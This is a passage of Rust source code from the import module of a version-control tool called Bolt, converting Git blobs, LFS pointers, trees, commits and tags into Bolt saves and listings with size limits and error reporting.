//! Turning Git's objects into Bolt's (decisions 032, 035 and 036): blobs into content, Git LFS
//! pointers into the files they stand for, trees into folder listings, commits into saves and
//! tags into Bolt tags. Each Git object is converted once, and the same repository always gives
//! the same saves.
#![deny(clippy::indexing_slicing, clippy::arithmetic_side_effects)]

use std::borrow::Cow;
use std::collections::{BTreeMap, HashMap, HashSet};
use std::io::{self, Read};
use std::path::Path;

use encoding_rs::{Encoding, UTF_8};
use sha2::{Digest as _, Sha256};

use super::{ImportError, LfsElsewhere};
use crate::chunks::{is_cut, is_too_long_to_cut};
use crate::diary::{
    self, MAX_GIT_TAG_OBJECT_BYTES, MAX_GIT_TAG_OBJECTS, MAX_TAG_MESSAGE_BYTES, MAX_TAGS, TagList,
};
use crate::encoding::DecodeError;
use crate::git::{
    self, Commit, GitError, GitId, LfsPointer, MAX_LFS_POINTER_BYTES, ObjectType,
    is_exact_lfs_pointer, is_lfs_lookalike, lfs_pointer, parse_commit, parse_person, parse_tag,
    parse_tree, rebuild_commit, shown,
};
use crate::id::{ChangeId, ContentHasher, Id, hash_record};
use crate::ingest::{self, IngestError};
use crate::link::ProjectLink;
use crate::listing::{Entry, EntryKind, Listing, SaveLimits};
use crate::names::{MAX_NAME_BYTES, NameError, is_git_alias, validate_name};
use crate::pack::{MAX_RECORD_SIZE, ObjectKind, PackError, PackSet};
use crate::repo::RepoError;
use crate::save::{
    EXTRA_GIT_COMMIT, EXTRA_GIT_HEADER, EXTRA_GIT_ORIGINAL_MESSAGE, MAX_EXTRA_VALUE_BYTES,
    MAX_MESSAGE_BYTES, Save,
};
use crate::store::Store;

/// Blobs up to this size are read whole; bigger ones stream through once, or twice if they are
/// too long to cut.
const MAX_WHOLE_BLOB: u64 = 64 << 20;

/// The biggest commit a save can keep exactly: its header lines, the empty line and its message
/// (decision 032).
const MAX_COMMIT_BYTES: u64 = MAX_EXTRA_VALUE_BYTES as u64 + 1 + MAX_MESSAGE_BYTES as u64;

/// Parents an import may add beyond each commit's first, all commits together: a save keeps its
/// parents whole, so megabytes of Git merges could otherwise take gigabytes of disk (decision 043).
pub(super) const MAX_EXTRA_PARENTS: u64 = 1_000_000;

/// How many of a kind of thing an import leaves out, renames, or warns about, it lists: skipped
/// entries, names that aren't UTF-8, refs, `.bolt` folders, and in its summary, renamed names and
/// skipped tags. The rest are counted.
pub const MAX_LISTED: usize = 100;

/// How many files that only look like Git LFS pointers an import's warning names.
const MAX_LOOKALIKES_LISTED: usize = 5;

/// About the most bytes of a path a list or message holds.
const MAX_SHOWN_PATH: usize = 1024;

const BUG_HINT: &str = "Nothing was changed. This is a bug in Bolt, not a problem with the \
                        repository.";

/// A stop that only a bug in Bolt can cause.
pub(super) fn bug(what: String) -> ImportError {
    ImportError::Stop {
        what: format!("{what}; please report this."),
        hint: Some(BUG_HINT.to_owned()),
    }
}

fn unimportable(what: String) -> ImportError {
    GitError::Unimportable { what }.into()
}

/// `e`, saying where it was met: Git's parsers can't name the object they refuse.
pub(super) fn at(e: GitError, place: impl FnOnce() -> String) -> ImportError {
    match e {
        GitError::Broken { what } => GitError::Broken {
            what: format!("{what}, in {}", place()),
        },
        GitError::Unimportable { what } => GitError::Unimportable {
            what: format!("{what}, in {}", place()),
        },
        GitError::EndedEarly { what } => GitError::EndedEarly {
            what: format!("{what}, in {}", place()),
        },
        // Where the import stopped, which needn't be where the fault is.
        GitError::TooMuchWork { what } => GitError::TooMuchWork {
            what: format!("{what}; the import stopped while reading {}", place()),
        },
        other => other,
    }
    .into()
}

/// Refuses an object found to be of another kind than the one it was named as.
pub(super) fn expect_kind(
    found: ObjectType,
    kind: ObjectType,
    id: &GitId,
    place: impl FnOnce() -> String,
) -> Result<(), ImportError> {
    if found == kind {
        return Ok(());
    }
    let what = format!(
        "object `{}` is a {}, not a {}",
        id.to_hex(),
        found.name(),
        kind.name()
    );
    Err(at(GitError::Broken { what }, place))
}

/// What an import reports besides its saves.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct Counts {
    /// Commits a later export can't recreate with their Git IDs: a tree in a form Git no longer
    /// writes, or entries skipped (decisions 032 and 035).
    pub inexact_commits: u64,
    /// The first 100 entries skipped, each as the commit (hex) and the path where it was met
    /// first. Paths are as Git has them, not escaped; a name is cut to 255 bytes, and a path to
    /// about its last 1 KiB.
    pub skipped_entries: Vec<(String, String)>,
    /// Every entry skipped, the listed ones included.
    pub skipped_entry_count: u64,
    /// Commits whose `change-id` header gives a change ID another commit has too, so their saves
    /// took their own commits' change IDs instead (decision 043).
    pub duplicate_change_ids: u64,
    /// Git LFS files brought in from `.git/lfs/objects`, each object once, and their total size,
    /// which saturates.
    pub lfs_files: u64,
    pub lfs_bytes: u64,
    /// Commits that hold Git LFS files.
    pub lfs_commits: u64,
    /// Git LFS pointers not in the exact form Git LFS writes.
    pub inexact_lfs_pointers: u64,
    /// The first 5 files that look like Git LFS pointers but aren't Git LFS files, each as the
    /// commit (hex) and the path where it was met first, and how many in all.
    pub lfs_lookalikes: Vec<(String, String)>,
    pub lfs_lookalike_count: u64,
}

/// What a Git tag becomes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TagOutcome {
    Tag(diary::Tag),
    /// It doesn't end at a commit; `reason` says what it tags instead.
    Skipped {
        reason: String,
    },
}

/// A converted Git tree: its listing, the entries in it and below it counting every path, how
/// many levels of folders are below it, how long the longest path below it is from it, whether
/// an export gives its Git ID back, and whether it holds a Git LFS file.
#[derive(Clone, Copy)]
struct Folder {
    listing: Id,
    total: u64,
    depth: usize,
    longest: usize,
    exact: bool,
    lfs: bool,
}

/// A folder on the walk's stack, with the entries of its Git tree still to convert. `prefix` is
/// how long its path is with a `/` after it (0 for the top).
struct Frame {
    git: GitId,
    name: String,
    prefix: usize,
    left: std::vec::IntoIter<Item>,
    entries: Vec<Entry>,
    total: u64,
    depth: usize,
    longest: usize,
    exact: bool,
    lfs: bool,
}

/// A tree entry whose name passed.
struct Item {
    name: String,
    kind: EntryKind,
    id: GitId,
}

/// Where a chain of Git tag objects ends, from one of them on, or from the tree or blob it ends
/// at, which counts no tag objects.
#[derive(Clone, Copy)]
struct Chain {
    /// The tag objects from that one to the end, it included.
    objects: u64,
    /// What the last of them tags: a commit, a tree or a blob.
    end: ObjectType,
}

/// A tag that ends at `end`, a tree or a blob, which Bolt can't tag (decision 034).
fn skipped(end: ObjectType) -> TagOutcome {
    let what = if end == ObjectType::Tree {
        "a folder (a Git tree)"
    } else {
        "a file (a Git blob)"
    };
    TagOutcome::Skipped {
        reason: format!("it tags {what}, not a commit"),
    }
}

/// Stops at the tag `name` if its chain holds more tag objects than Bolt keeps (decision 034):
/// `objects` is how many it holds at least. The import's first pass and `Converter::tag` both
/// hold tags to this and `check_tag_object`, so they refuse the same tags alike.
pub(super) fn check_tag_chain(name: &str, objects: u64) -> Result<(), ImportError> {
    if objects <= MAX_GIT_TAG_OBJECTS {
        return Ok(());
    }
    Err(unimportable(format!(
        "tag `{name}` reaches its commit through more than {MAX_GIT_TAG_OBJECTS} tag objects, \
         more than Bolt keeps"
    )))
}

/// Stops at the tag `name` if its tag object `id`, of `size` bytes, is bigger than Bolt keeps of
/// one (decision 034).
pub(super) fn check_tag_object(name: &str, id: &GitId, size: u64) -> Result<(), ImportError> {
    if size <= MAX_GIT_TAG_OBJECT_BYTES as u64 {
        return Ok(());
    }
    Err(unimportable(format!(
        "tag `{name}` has a tag object of {size} bytes (`{}`), more than the 1 MiB Bolt keeps \
         of one",
        id.to_hex()
    )))
}

/// What the tag list will hold so far, counted tag by tag, against the most it may: the limit of
/// a record (decision 034), which tests lower. The import's first pass counts with one, and
/// `Converter::tag` with another, so both stop at the same tag with the same words.
#[derive(Clone, Copy)]
pub(super) struct TagBudget {
    used: u64,
    most: u64,
}

impl TagBudget {
    pub(super) fn new() -> TagBudget {
        TagBudget {
            used: TagList::head_len(MAX_TAGS),
            most: MAX_RECORD_SIZE,
        }
    }

    /// Stops before the tag `name` is read if even a tag of no message and no tag objects
    /// wouldn't fit, so a spent budget reads no more tags.
    pub(super) fn room_for(&self, name: &str) -> Result<(), ImportError> {
        let least = TagList::tag_len_from(name.len(), 0, std::iter::empty());
        self.check(name, self.used.saturating_add(least))
    }

    /// What the list holds so far, as counted: its tags, and its head at its longest.
    pub(super) fn used(&self) -> u64 {
        self.used
    }

    /// Counts the tag `name`, which takes `len` bytes of the list as `TagList::tag_len` says.
    pub(super) fn add(&mut self, name: &str, len: u64) -> Result<(), ImportError> {
        let total = self.used.saturating_add(len);
        self.check(name, total)?;
        self.used = total;
        Ok(())
    }

    fn check(&self, name: &str, total: u64) -> Result<(), ImportError> {
        if total <= self.most {
            return Ok(());
        }
        Err(ImportError::Stop {
            what: format!(
                "Bolt's tag list can't hold the Git tags: with tag `{name}`, their names, \
                 messages and tag objects come to more than the 512 MiB it holds."
            ),
            hint: Some(
                "Nothing was changed. Delete tags you don't need with `git tag -d <name>`, then \
                 run bolt import again."
                    .to_owned(),
            ),
        })
    }
}

/// The Bolt message of a Git tag object's message (decision 034): converted to UTF-8 as a
/// commit's is, and cut to the 64 KiB a tag's message holds.
pub(super) fn tag_message(bytes: &[u8]) -> String {
    let mut message = message_text(bytes, None).into_owned();
    message.truncate(message.floor_char_boundary(MAX_TAG_MESSAGE_BYTES));
    message
}

/// One commit's snapshot as far as it has been walked.
struct Walk<'c> {
    commit: &'c str,
    limits: SaveLimits,
}

impl Walk<'_> {
    /// Checks that a folder `level` levels below the top is within the save's limit.
    fn depth(&self, level: usize) -> Result<(), ImportError> {
        self.limits
            .check_depth(level)
            .map_err(|why| self.too_big(&why))
    }

    /// Counts `n` more entries against the save's limit.
    fn add(&mut self, n: u64) -> Result<(), ImportError> {
        let added = self.limits.add(usize::try_from(n).unwrap_or(usize::MAX));
        added.map_err(|why| self.too_big(&why))
    }

    /// Checks that a path `len` bytes long is within the save's limit, naming it as `shown`
    /// gives it if it isn't.
    fn path(&self, len: usize, shown: impl FnOnce() -> String) -> Result<(), ImportError> {
        let checked = self.limits.check_path(len);
        checked.map_err(|why| self.too_big(&format!("{why}: `{}`", shown())))
    }

    fn too_big(&self, why: &str) -> ImportError {
        unimportable(format!(
            "commit `{}` can't become one save, because {why}",
            self.commit
        ))
    }
}

/// Feeds what is written to it to a content hasher, so `io::copy` can hash a stream.
struct Hashing<'a>(&'a mut ContentHasher);

impl io::Write for Hashing<'_> {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        self.0.update(buf);
        Ok(buf.len())
    }

    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

/// Whether an entry of `kind` can be a Git LFS file: only a file can, as Git LFS's filter runs
/// only on files, and Git checks a link out as it is.
pub(super) fn may_be_lfs(kind: EntryKind) -> bool {
    matches!(kind, EntryKind::File | EntryKind::Executable)
}

/// The rules for a Git LFS pointer, which both passes follow, so the first never lets through
/// what the second stops at.
pub(super) struct LfsRules<'g> {
    git: &'g git::Repo,
    /// Where `lfs.storage` keeps Git LFS's files instead of `.git/lfs/objects`, if it does.
    setting: Option<LfsElsewhere>,
    /// Whether `.git/lfs` and `.git/lfs/objects` were found to be no link.
    folders_checked: bool,
}

impl<'g> LfsRules<'g> {
    pub(super) fn new(git: &'g git::Repo, setting: Option<LfsElsewhere>) -> LfsRules<'g> {
        LfsRules {
            git,
            setting,
            folders_checked: false,
        }
    }

    /// Whether the pointer `p`, at `path` in the commit `commit` (hex), needs its object read. A
    /// pointer with extensions stops the import; one of size 0 is an empty file; any other stops
    /// it while Git LFS keeps its objects elsewhere. The folders are looked at only here, so an
    /// import with no Git LFS file is never stopped by them, nor by an error reading them.
    pub(super) fn needs_object(
        &mut self,
        p: &LfsPointer,
        commit: &str,
        path: &dyn Fn() -> String,
    ) -> Result<bool, ImportError> {
        if p.extensions {
            return Err(ImportError::LfsExtension {
                commit: commit.to_owned(),
                path: path(),
            });
        }
        if p.size == 0 {
            return Ok(false);
        }
        let kept = match &self.setting {
            Some(kept) => Some(kept.clone()),
            None if self.folders_checked => None,
            None => {
                let linked = self.git.lfs_folder_link()?;
                self.folders_checked = linked.is_none();
                linked.map(|folder| LfsElsewhere::Linked {
                    folder: folder.to_owned(),
                })
            }
        };
        match kept {
            Some(kept) => Err(ImportError::LfsElsewhere {
                kept,
                commit: commit.to_owned(),
                path: path(),
            }),
            None => Ok(true),
        }
    }

    /// The stop for Git LFS files whose objects are missing: the first, by commit (hex), path
    /// and size, how many objects in all, and their total size.
    pub(super) fn missing(
        &self,
        first: Vec<(String, String, u64)>,
        count: u64,
        bytes: u64,
    ) -> ImportError {
        ImportError::LfsMissing {
            first,
            count,
            bytes,
            config_includes: self.git.has_config_includes(),
        }
    }
}

/// Reads a blob, keeping its first bytes as they pass, as many as Git LFS's smudge filter reads.
struct Start<R> {
    inner: R,
    start: Vec<u8>,
}

impl<R> Start<R> {
    fn new(inner: R) -> Start<R> {
        Start {
            inner,
            start: Vec::with_capacity(MAX_LFS_POINTER_BYTES),
        }
    }
}

impl<R: Read> Read for Start<R> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        let n = self.inner.read(buf)?;
        let room = MAX_LFS_POINTER_BYTES.saturating_sub(self.start.len());
        self.start
            .extend_from_slice(buf.get(..n.min(room)).unwrap_or_default());
        Ok(n)
    }
}

/// Reads a Git LFS object, computing as the bytes pass the SHA-256 that Git LFS names it by.
struct Sha256Reading<R> {
    inner: R,
    hasher: Sha256,
}

impl<R: Read> Read for Sha256Reading<R> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        let n = self.inner.read(buf)?;
        // A reader that says it gave more than `buf` holds hashes nothing, and can't match.
        self.hasher.update(buf.get(..n).unwrap_or_default());
        Ok(n)
    }
}

/// Converts one Git repository's objects into one command's packs. The packs only know the
/// objects of the pack being written, and the store only what was committed before, so memo
/// tables keep each Git object to one conversion, and a set of the records stored keeps a record
/// two Git objects make alike to one copy.
pub struct Converter<'r> {
    git: &'r git::Repo,
    store: &'r Store,
    packs: &'r mut PackSet,
    /// Each blob's content ID and size, and whether it was a Git LFS file, by whether it was met
    /// as a file: a link is never a Git LFS file.
    blobs: HashMap<(GitId, bool), (Id, u64, bool)>,
    /// Blobs a family rebuild stored before they were met that start with a Git LFS pointer: each
    /// is noted as a look-alike where it is first met as a file.
    lookalike_members: HashSet<GitId>,
    /// The content of each Git LFS object stored, by oid and size.
    lfs: HashMap<([u8; 32], u64), Id>,
    /// What a Git LFS pointer needs, as the first pass judges it too.
    lfs_rules: LfsRules<'r>,
    /// Each submodule commit's link record.
    links: HashMap<GitId, Id>,
    /// Each tree converted whole, wherever it was met.
    trees: HashMap<GitId, Folder>,
    /// Each commit's save.
    saves: HashMap<GitId, Id>,
    /// Every record this converter stored, or found stored.
    records: HashSet<Id>,
    counts: Counts,
    /// The first names met that aren't UTF-8, by commit (hex) and path, and how many in all.
    not_utf8: Vec<(String, String)>,
    not_utf8_count: u64,
    /// Where the chain from each Git tag object read ends.
    chains: HashMap<GitId, Chain>,
    /// What the tag list will hold so far. The import's first pass counts the same, so this
    /// only guards against the two ever counting differently.
    tags: TagBudget,
    /// Change IDs no `change-id` header may give: those a header gave already, and those that
    /// commits' own IDs give (decision 043).
    change_ids: HashSet<ChangeId>,
}

impl<'r> Converter<'r> {
    /// A converter into `packs`. `own_change_ids` are the change IDs that commits' own IDs give
    /// and some commit's `change-id` header gives too, as the import's first pass finds them.
    /// `lfs_storage` says where `lfs.storage` keeps Git LFS's objects instead of
    /// `.git/lfs/objects`, if it does, so the first Git LFS file met stops the conversion.
    #[must_use]
    pub fn new(
        git: &'r git::Repo,
        store: &'r Store,
        packs: &'r mut PackSet,
        own_change_ids: HashSet<ChangeId>,
        lfs_storage: Option<LfsElsewhere>,
    ) -> Converter<'r> {
        Converter {
            git,
            store,
            packs,
            blobs: HashMap::new(),
            lookalike_members: HashSet::new(),
            lfs: HashMap::new(),
            lfs_rules: LfsRules::new(git, lfs_storage),
            links: HashMap::new(),
            trees: HashMap::new(),
            saves: HashMap::new(),
            records: HashSet::new(),
            counts: Counts::default(),
            not_utf8: Vec::new(),
            not_utf8_count: 0,
            chains: HashMap::new(),
            tags: TagBudget::new(),
            change_ids: own_change_ids,
        }
    }

    #[must_use]
    pub fn counts(&self) -> &Counts {
        &self.counts
    }

    /// The save of the commit `id`, which must be converted already.
    pub fn save_of(&self, id: &GitId) -> Result<Id, ImportError> {
        self.saves.get(id).copied().ok_or_else(|| {
            bug(format!(
                "Bolt needed the save of commit `{}` before it made it",
                id.to_hex()
            ))
        })
    }

    /// Stops the import if any name met so far isn't UTF-8 (decision 019). The converter leaves
    /// such names out of their folders and goes on, so that one stop lists them all: call this
    /// after the last commit, and before committing anything.
    pub fn finish(&self) -> Result<(), ImportError> {
        if self.not_utf8_count == 0 {
            return Ok(());
        }
        Err(ImportError::NotUtf8Names {
            first: self.not_utf8.clone(),
            count: self.not_utf8_count,
        })
    }

    /// Stores the save of the commit `id`, with its snapshot (decision 032). Its parents must be
    /// converted already: their saves are taken from what this converter made, in the commit's
    /// own order. A commit converted already gives the same save.
    pub fn commit(&mut self, id: &GitId) -> Result<Id, ImportError> {
        if let Some(save) = self.saves.get(id) {
            return Ok(*save);
        }
        let hex = id.to_hex();
        let object = read_commit(self.git, id)?;
        let c = parse_commit(&object.data, self.git.hash())
            .map_err(|e| at(e, || format!("commit `{hex}`")))?;
        keepable(&c, &hex)?;
        // Git may list a parent twice and a save can't; `git-header` keeps the commit exact.
        let (mut parents, mut git_parents) = (Vec::new(), Vec::new());
        for git in &c.parents {
            let save = self.save_of(git)?;
            if !parents.contains(&save) {
                parents.push(save);
                git_parents.push(*git);
            }
        }
        let root = self.snapshot(&c.tree, &hex)?;
        let message = message_text(c.message, c.encoding);
        let mut extra = BTreeMap::from([(EXTRA_GIT_COMMIT.to_owned(), hex.clone().into_bytes())]);
        if message.as_bytes() != c.message {
            extra.insert(EXTRA_GIT_ORIGINAL_MESSAGE.to_owned(), c.message.to_vec());
        }
        let own = ChangeId::from_git_commit(id.as_bytes());
        // A header's change ID goes to one save only, so no two saves share one (decision 043).
        let change_id = match c.change_id.and_then(ChangeId::from_jujutsu) {
            Some(wanted) if self.change_ids.insert(wanted) => wanted,
            Some(_) => {
                let counts = &mut self.counts;
                counts.duplicate_change_ids = counts.duplicate_change_ids.saturating_add(1);
                own
            }
            None => own,
        };
        let mut save = Save {
            root: root.listing,
            parents,
            author: parse_person(c.author),
            saver: parse_person(c.committer),
            message: message.into_owned(),
            change_id,
            move_notes: Vec::new(),
            signature: Vec::new(),
            extra,
        };
        // An export has only the save, with its parents as the save lists them.
        if rebuild_commit(&save, &c.tree, &git_parents) != object.data {
            save.extra
                .insert(EXTRA_GIT_HEADER.to_owned(), c.header.to_vec());
            if rebuild_commit(&save, &c.tree, &git_parents) != object.data {
                return Err(bug(format!("Bolt couldn't keep commit `{hex}` exactly")));
            }
        }
        let encoded = save.encode();
        // Refuse a save that wouldn't read back before storing it.
        Save::decode(&encoded, false).map_err(|e| {
            bug(format!(
                "Bolt made a save of commit `{hex}` it can't read back ({e})"
            ))
        })?;
        let save_id = self.put(ObjectKind::Save, &encoded)?;
        if !root.exact {
            self.counts.inexact_commits = self.counts.inexact_commits.saturating_add(1);
        }
        if root.lfs {
            self.counts.lfs_commits = self.counts.lfs_commits.saturating_add(1);
        }
        self.saves.insert(*id, save_id);
        Ok(save_id)
    }

    /// What the Git tag `name` (as Bolt's tag list will name it) at `target` becomes (decision
    /// 034): a commit is a lightweight tag; annotated tags are followed to their commit, keeping
    /// each tag object, outermost first, and the outermost's message. The commit must be
    /// converted already.
    ///
    /// Each tag object is read once to learn where its chain ends; a chain that ends at a commit
    /// is read again for each tag kept through it, since each keeps its bytes. Every tag kept
    /// counts toward the 512 MiB one tag list holds, and reading holds one chain more, at most
    /// 16 MiB. The converter keeps no tag's bytes, so a caller that writes each tag into the list
    /// and lets it go holds the list once.
    pub fn tag(&mut self, name: &str, target: &GitId) -> Result<TagOutcome, ImportError> {
        self.tags.room_for(name)?;
        let outcome = self.read_tag(name, target)?;
        if let TagOutcome::Tag(tag) = &outcome {
            self.tags.add(name, TagList::tag_len(name, tag))?;
        }
        Ok(outcome)
    }

    /// Follows the tag `name` from `target` to what it tags. A tag object met before tells where
    /// its chain ends: one that ends at a tree or blob isn't read again, and one that ends at a
    /// commit is, for the bytes the tag keeps.
    fn read_tag(&mut self, name: &str, target: &GitId) -> Result<TagOutcome, ImportError> {
        let mut id = *target;
        // The tag objects read so far, outermost first, and their bytes.
        let mut read: Vec<GitId> = Vec::new();
        let mut git_tags: Vec<Vec<u8>> = Vec::new();
        let mut message = String::new();
        loop {
            if let Some(save) = self.saves.get(&id).copied() {
                self.remember(&read, 0, ObjectType::Commit);
                return Ok(TagOutcome::Tag(diary::Tag {
                    save,
                    message,
                    git_tags,
                }));
            }
            let known = self.chains.get(&id).copied();
            if let Some(known) = known {
                check_tag_chain(name, (read.len() as u64).saturating_add(known.objects))?;
                if known.end != ObjectType::Commit {
                    self.remember(&read, known.objects, known.end);
                    return Ok(skipped(known.end));
                }
            }
            let hex = id.to_hex();
            // The ref's own target may be a commit, or missing, as well as a tag object.
            let here = || format!("tag `{name}`, at object `{hex}`");
            // A tag object known to lead to a commit was read before, and reading it checks it
            // again; anything else is looked at first. The header isn't checked against the ID.
            if known.is_none() {
                let (kind, size) = self.git.header(&id).map_err(|e| at(e, here))?;
                match kind {
                    ObjectType::Tag => {}
                    ObjectType::Tree | ObjectType::Blob => {
                        self.chains.entry(id).or_insert(Chain {
                            objects: 0,
                            end: kind,
                        });
                        self.remember(&read, 0, kind);
                        return Ok(skipped(kind));
                    }
                    ObjectType::Commit => {
                        return Err(bug(format!(
                            "Bolt was asked for tag `{name}` before importing its commit `{hex}`"
                        )));
                    }
                }
                check_tag_object(name, &id, size)?;
            }
            check_tag_chain(name, (read.len() as u64).saturating_add(1))?;
            let object = self.git.read(&id).map_err(|e| at(e, here))?;
            expect_kind(object.kind, ObjectType::Tag, &id, here)?;
            check_tag_object(name, &id, object.data.len() as u64)?;
            let tag = parse_tag(&object.data, self.git.hash()).map_err(|e| at(e, here))?;
            if read.is_empty() {
                message = tag_message(tag.message);
            }
            read.push(id);
            id = tag.object;
            git_tags.push(object.data);
        }
    }

    /// Remembers where the chain from each tag object `read` ends: `rest` tag objects past the
    /// last of them, then `end`.
    fn remember(&mut self, read: &[GitId], rest: u64, end: ObjectType) {
        for (i, object) in read.iter().enumerate() {
            let objects = (read.len().saturating_sub(i) as u64).saturating_add(rest);
            self.chains.entry(*object).or_insert(Chain { objects, end });
        }
    }

    /// Converts the tree `root` of the commit `commit` (hex) with everything in it, on a stack
    /// of its own: Git trees can nest thousands of levels deep.
    fn snapshot(&mut self, root: &GitId, commit: &str) -> Result<Folder, ImportError> {
        let mut walk = Walk {
            commit,
            limits: SaveLimits::default(),
        };
        let mut stack: Vec<Frame> = Vec::new();
        let mut done = self.enter(&mut stack, &mut walk, String::new(), root)?;
        while let Some(top) = stack.last_mut() {
            match top.left.next() {
                Some(item) if item.kind == EntryKind::Folder => {
                    done = self.enter(&mut stack, &mut walk, item.name, &item.id)?;
                }
                Some(item) => {
                    let (entry, lfs) = self.leaf(item, &stack, commit)?;
                    if let Some(top) = stack.last_mut() {
                        top.entries.push(entry);
                        top.lfs |= lfs;
                    }
                }
                None => {
                    if let Some(frame) = stack.pop() {
                        let (name, folder) = self.close(frame)?;
                        done = attach(&mut stack, name, folder);
                    }
                }
            }
        }
        done.ok_or_else(|| {
            bug(format!(
                "Bolt lost track of the snapshot of commit `{commit}`"
            ))
        })
    }

    /// Goes into the folder `name`, the Git tree `id`: one converted before is attached to the
    /// folder above at once, any other is read onto the stack. Returns the top folder once done.
    fn enter(
        &mut self,
        stack: &mut Vec<Frame>,
        walk: &mut Walk<'_>,
        name: String,
        id: &GitId,
    ) -> Result<Option<Folder>, ImportError> {
        // The top folder is level 0, and its path is empty.
        let level = stack.len();
        let prefix = stack.last().map_or(0, |above| {
            above.prefix.saturating_add(name.len()).saturating_add(1)
        });
        if let Some(done) = self.trees.get(id).copied() {
            // A backstop, as below: the paths checked next pass their limit before this depth.
            walk.depth(level.saturating_add(done.depth))?;
            // Its own path was checked in the folder above; the paths below it may be too long here.
            if done.longest > 0 {
                let shown = || format!("{}/…", path_of(stack, &[name.as_str()]));
                walk.path(prefix.saturating_add(done.longest), shown)?;
            }
            walk.add(done.total)?;
            return Ok(attach(stack, name, done));
        }
        // A backstop: a folder this deep has a path past its limit, which the folder above checked.
        walk.depth(level)?;
        stack.push(Frame {
            git: *id,
            name,
            prefix,
            left: Vec::new().into_iter(),
            entries: Vec::new(),
            total: 0,
            depth: 0,
            longest: 0,
            exact: true,
            lfs: false,
        });
        self.read_folder(stack, walk)?;
        Ok(None)
    }

    /// Reads the Git tree of the folder on top of the stack and judges its names: those that
    /// aren't UTF-8 are left out and listed, for `finish` to stop at (decision 019), dangerous
    /// ones and spellings of `.bolt` skipped (decisions 035 and 019), and one too long, or with a
    /// path too long, stops the import (decision 051).
    fn read_folder(&mut self, stack: &mut [Frame], walk: &mut Walk<'_>) -> Result<(), ImportError> {
        let Some((id, prefix)) = stack.last().map(|top| (top.git, top.prefix)) else {
            return Ok(());
        };
        let commit = walk.commit;
        let place = || {
            let path = path_of(stack, &[]);
            let folder = if path.is_empty() {
                "the top folder".to_owned()
            } else {
                format!("the folder `{path}`")
            };
            format!("{folder} (tree `{}`) of commit `{commit}`", id.to_hex())
        };
        let object = self.git.read(&id).map_err(|e| at(e, place))?;
        expect_kind(object.kind, ObjectType::Tree, &id, place)?;
        let entries = parse_tree(&object.data, self.git.hash()).map_err(|e| at(e, place))?;
        let mut items = Vec::new();
        let mut exact = true;
        let mut longest = 0;
        for e in entries {
            exact &= e.standard_mode;
            let Ok(name) = std::str::from_utf8(e.name) else {
                exact = false;
                self.not_utf8(commit, || path_of(stack, &[shown(e.name).as_str()]));
                continue;
            };
            match validate_name(name) {
                Ok(()) if !is_git_alias(name) => {
                    walk.path(prefix.saturating_add(name.len()), || {
                        path_of(stack, &[name])
                    })?;
                    longest = longest.max(name.len());
                    items.push(Item {
                        name: name.to_owned(),
                        kind: e.kind,
                        id: e.id,
                    });
                }
                Err(NameError::TooLong) => {
                    return Err(unimportable(format!(
                        "commit `{commit}` has a name longer than {MAX_NAME_BYTES} bytes, more \
                         than Bolt allows: `{}`",
                        path_of(stack, &[shown(e.name).as_str()])
                    )));
                }
                _ => {
                    exact = false;
                    // A name holding `/` can be any length: it is listed cut, like any other.
                    self.skipped(commit, || path_of(stack, &[shown(e.name).as_str()]));
                }
            }
        }
        let total = items.len() as u64;
        walk.add(total)?;
        if let Some(top) = stack.last_mut() {
            top.entries = Vec::with_capacity(items.len());
            top.left = items.into_iter();
            top.total = total;
            top.longest = longest;
            top.exact = exact;
        }
        Ok(())
    }

    /// Notes an entry left out, listing the first ones by path.
    fn skipped(&mut self, commit: &str, path: impl FnOnce() -> String) {
        let counts = &mut self.counts;
        counts.skipped_entry_count = counts.skipped_entry_count.saturating_add(1);
        if counts.skipped_entries.len() < MAX_LISTED {
            counts.skipped_entries.push((commit.to_owned(), path()));
        }
    }

    /// Notes a name that isn't UTF-8, listing the first ones by path.
    fn not_utf8(&mut self, commit: &str, path: impl FnOnce() -> String) {
        self.not_utf8_count = self.not_utf8_count.saturating_add(1);
        if self.not_utf8.len() < MAX_LISTED {
            self.not_utf8.push((commit.to_owned(), path()));
        }
    }

    /// Stores the listing of a folder whose entries are all converted, and remembers it for
    /// wherever its Git tree comes again.
    fn close(&mut self, frame: Frame) -> Result<(String, Folder), ImportError> {
        let made = |e: DecodeError| {
            bug(format!(
                "Bolt made a listing of tree `{}` it can't read back ({e})",
                frame.git.to_hex()
            ))
        };
        let listing = Listing::new(frame.entries).map_err(made)?;
        let encoded = listing.encode();
        Listing::decode(&encoded).map_err(made)?;
        let done = Folder {
            listing: self.put(ObjectKind::FolderListing, &encoded)?,
            total: frame.total,
            depth: frame.depth,
            longest: frame.longest,
            exact: frame.exact,
            lfs: frame.lfs,
        };
        self.trees.insert(frame.git, done);
        Ok((frame.name, done))
    }

    /// The entry of a file, symlink or submodule in the folder on top of the stack, and whether
    /// it is a Git LFS file.
    fn leaf(
        &mut self,
        item: Item,
        stack: &[Frame],
        commit: &str,
    ) -> Result<(Entry, bool), ImportError> {
        let (id, size, lfs) = if item.kind == EntryKind::ProjectLink {
            (self.link(&item.id)?, 0, false)
        } else {
            let path = || path_of(stack, &[item.name.as_str()]);
            self.blob(&item.id, may_be_lfs(item.kind), commit, &path)?
        };
        let entry = Entry {
            name: item.name,
            kind: item.kind,
            id,
            size,
        };
        Ok((entry, lfs))
    }

    /// A submodule's link: just the commit, with an empty address (decision 036).
    fn link(&mut self, commit: &GitId) -> Result<Id, ImportError> {
        if let Some(id) = self.links.get(commit) {
            return Ok(*id);
        }
        let encoded = ProjectLink::submodule(commit.as_bytes()).encode();
        ProjectLink::decode(&encoded).map_err(|e| {
            bug(format!(
                "Bolt made a link to submodule commit `{}` it can't read back ({e})",
                commit.to_hex()
            ))
        })?;
        let id = self.put(ObjectKind::ProjectLink, &encoded)?;
        self.links.insert(*commit, id);
        Ok(id)
    }

    /// A blob's content ID and size, stored the first time it is met as a file or as a link, and
    /// whether it is a Git LFS file: a file Git LFS's parser takes for a pointer, which is brought
    /// in as the file it stands for. Any other file Git LFS may still read as a pointer, or that
    /// looks like one (`is_lfs_lookalike`), comes in as it is, noted for a warning. `path` says
    /// where, for messages.
    fn blob(
        &mut self,
        id: &GitId,
        file: bool,
        commit: &str,
        path: &dyn Fn() -> String,
